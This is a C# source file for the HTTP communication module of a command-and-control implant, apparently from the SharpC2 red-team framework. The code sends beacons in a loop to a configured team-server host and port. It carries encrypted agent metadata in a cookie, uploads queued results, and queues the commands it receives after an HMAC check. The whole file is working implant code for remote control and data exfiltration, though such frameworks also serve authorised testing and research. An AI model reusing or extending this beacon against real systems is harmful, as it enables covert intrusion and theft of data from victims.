using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common.Models;

using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Modules
{
    class HttpCommModule : ICommModule
    {
        private CryptoController Crypto { get; set; }
        private ConfigController Config { get; set; }
        private ModuleStatus ModuleStatus { get; set; }
        private Queue<AgentMessage> InboundC2Data { get; set; } = new Queue<AgentMessage>();
        private Queue<AgentMessage> OutboundC2Data { get; set; } = new Queue<AgentMessage>();
        private int MaxRetryCount { get; } = 3600;
        private int RetryCount { get; set; } = 0;

        public void Init(ConfigController config, CryptoController crypto)
        {
            ModuleStatus = ModuleStatus.Starting;
            Config = config;
            Crypto = crypto;
        }

        public bool RecvData(out AgentMessage message)
        {
            if (InboundC2Data.Count > 0)
            {
                message = InboundC2Data.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (ModuleStatus == ModuleStatus.Running)
                {
                    var sleepTime = (int)Config.GetOption(ConfigSetting.SleepInterval) * 1000;
                    var jitter = (int)Config.GetOption(ConfigSetting.SleepJitter);

                    AgentCheckIn();

                    // calculate difference

                    Thread.Sleep(sleepTime);
                };
            });
        }

        public void SendData(AgentMessage message)
        {
            OutboundC2Data.Enqueue(message);
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }

        private void AgentCheckIn()
        {
            var host = Config.GetOption(ConfigSetting.ConnectHosts) as string;
            var port = Config.GetOption(ConfigSetting.ConnectPort) as string;

            var metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata;
            var encryptedMetadata = Crypto.Encrypt(metadata);

            var client = new WebClient();
            client.Headers.Clear();
            client.Headers.Add("X-Malware", "SharpC2");
            client.Headers[HttpRequestHeader.Cookie] = string.Format("{0}={1}", "Metadata", Convert.ToBase64String(encryptedMetadata));

            client.DownloadDataCompleted += DownloadDataCallback;
            client.UploadDataCompleted += UploadDataCallback;

            List<AgentMessage> agentMessages = new List<AgentMessage>();

            if (OutboundC2Data.Count > 0)
            {
                while (OutboundC2Data.Count != 0)
                {
                    agentMessages.Add(OutboundC2Data.Dequeue());
                }

                var encryptedAgentMessage = Crypto.Encrypt(agentMessages);
                var dataToSend = string.Format("Message={0}", Convert.ToBase64String(encryptedAgentMessage));
                var uri = new Uri(string.Format("http://{0}:{1}", host, port));

                client.UploadDataAsync(uri, Encoding.UTF8.GetBytes(dataToSend));
            }
            else
            {
                agentMessages.Add(new AgentMessage
                {
                    IdempotencyKey = Guid.NewGuid().ToString(),
                    Metadata = new AgentMetadata { AgentID = metadata.AgentID },
                    Data = new C2Data { Module = "Core", Command = "AgentCheckIn" }
                });

                var encryptedAgentMessage = Crypto.Encrypt(agentMessages);
                var dataToSend = string.Format("Message={0}", Convert.ToBase64String(encryptedAgentMessage));
                var uri = new Uri(string.Format("http://{0}:{1}?{2}", host, port, dataToSend));

                client.DownloadDataAsync(uri);
            }

            client.Dispose();
        }

        private void UploadDataCallback(object sender, UploadDataCompletedEventArgs e)
        {
            try
            {
                ProcessTeamServerResponse(e.Result);
            }
            catch
            {
                IncrementRetryCount();
            }
        }

        private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
        {
            try
            {
                ProcessTeamServerResponse(e.Result);
            }
            catch
            {
                IncrementRetryCount();
            }
        }

        private void ProcessTeamServerResponse(byte[] response)
        {
            if (Crypto.VerifyHMAC(response))
            {
                var messages = Crypto.Decrypt<List<AgentMessage>>(response);

                if (messages != null)
                {
                    foreach (var message in messages)
                    {
                        InboundC2Data.Enqueue(message);
                    }
                }
            }
        }

        private void IncrementRetryCount()
        {
            RetryCount++;

            if (RetryCount == MaxRetryCount)
            {
                ModuleStatus = ModuleStatus.Stopped;
            }

            return;
        }

        public ModuleStatus GetStatus()
        {
            return ModuleStatus;
        }
    }
}